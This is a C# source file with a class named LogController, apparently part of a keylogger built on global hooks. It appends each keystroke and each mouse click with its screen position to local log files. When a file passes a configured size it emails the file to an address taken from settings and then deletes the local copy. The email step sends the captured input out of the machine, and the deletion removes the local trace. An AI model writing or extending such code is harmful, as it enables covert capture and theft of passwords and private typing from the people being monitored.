using System;
using System.IO;

namespace GlobalHooks
{
    public class LogController
    {
        private readonly Settings _settings;
        private const string KeyPressedLog = "./keyboard.log";
        private const string MousePressedLog = "./mouse.log";

        public LogController(Settings settings)
        {
            _settings = settings;
        }

        public void KeyboardLogging(string keyName)
        {
            using (var streamWriter = new StreamWriter(KeyPressedLog, true))
            {
                streamWriter.WriteLine(DateTime.Now + ": " + keyName + "");
                streamWriter.Dispose();
            }
            CheckSize(KeyPressedLog);
        }

        public void MouseLogging(string keyName, string position)
        {
            using (var streamWriter = new StreamWriter(MousePressedLog, true))
            {
                streamWriter.WriteLine(DateTime.Now + ": " + keyName + " " + " Position: " + position);
            }
            CheckSize(MousePressedLog);
        }

        private void CheckSize(string filePath)
        {
            if (new FileInfo(filePath).Length <= _settings.FileSize) return;
            if (string.IsNullOrEmpty(_settings.Email)) return;
            new EmailController().SendEmail(_settings.Email, "Log file", filePath);
            new FileInfo(filePath).Delete();
        }
    }
}
